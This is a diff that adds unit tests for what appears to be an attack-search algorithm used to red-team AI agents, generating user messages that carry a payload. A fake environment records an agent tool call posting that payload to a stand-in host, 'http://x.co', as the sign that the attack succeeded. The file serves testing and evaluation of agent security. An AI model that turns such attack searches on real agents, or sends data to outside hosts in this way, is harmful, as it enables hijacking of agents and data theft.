@@ -78,3 +78,59 @@ def test_replay_stop_triggers_on_either_bound():
     assert attack._replay_stop(10.0, 995.0, 20.0, 100.0, 1000.0) is True
     # neither bound -> continue
     assert attack._replay_stop(10.0, 10.0, 20.0, 100.0, 1000.0) is False
+
+
+import time as _time_mod
+
+
+class _ProbeEnv:
+    """Fake env: interact() sleeps `latency` and records a trace that fires iff `fire`."""
+    def __init__(self, latency=0.0, fire=True):
+        self.latency = latency
+        self.fire = fire
+        self._last = None
+        self.seed = 123
+        self.calls = 0
+
+    def reset(self, *a, **k):
+        self._last = {"tool_events": [], "user_messages": []}
+
+    def interact(self, msg, max_tool_hops=None):
+        self.calls += 1
+        if self.latency:
+            _time_mod.sleep(self.latency)
+        data = attack.PAYLOAD if self.fire else "demo"
+        self._last = {"tool_events": [
+            {"name": "http.post", "ok": True, "args": {"url": "http://x.co", "data": data}}],
+            "user_messages": [msg]}
+
+    def export_trace_dict(self):
+        return self._last
+
+
+def test_run_override_returns_exact_n_without_env():
+    algo = attack.AttackAlgorithm(config={"n_candidates": 7})
+    out = algo.run(None, attack.AttackRunConfig(time_budget_s=1.0))
+    assert len(out) == 7
+
+
+def test_run_none_env_falls_back():
+    algo = attack.AttackAlgorithm(config={})
+    out = algo.run(None, attack.AttackRunConfig(time_budget_s=1.0))
+    assert len(out) == attack.FALLBACK_N
+
+
+def test_fill_keeps_only_firing_and_respects_budget():
+    algo = attack.AttackAlgorithm(config={"replay_safe_frac": 0.9, "slowest0": 0.01})
+    env = _ProbeEnv(latency=0.01, fire=True)
+    cfg = attack.AttackRunConfig(time_budget_s=0.5, max_tool_hops=8)
+    out = algo.run(env, cfg)
+    assert len(out) >= 1
+    assert all(len(c.user_messages) == 1 and attack.PAYLOAD in c.user_messages[0] for c in out)
+
+
+def test_fill_nonfiring_returns_fallback():
+    algo = attack.AttackAlgorithm(config={"slowest0": 0.01})
+    env = _ProbeEnv(latency=0.001, fire=False)
+    out = algo.run(env, attack.AttackRunConfig(time_budget_s=0.3, max_tool_hops=8))
+    assert len(out) == attack.FALLBACK_N  # nothing fired -> blind fallback
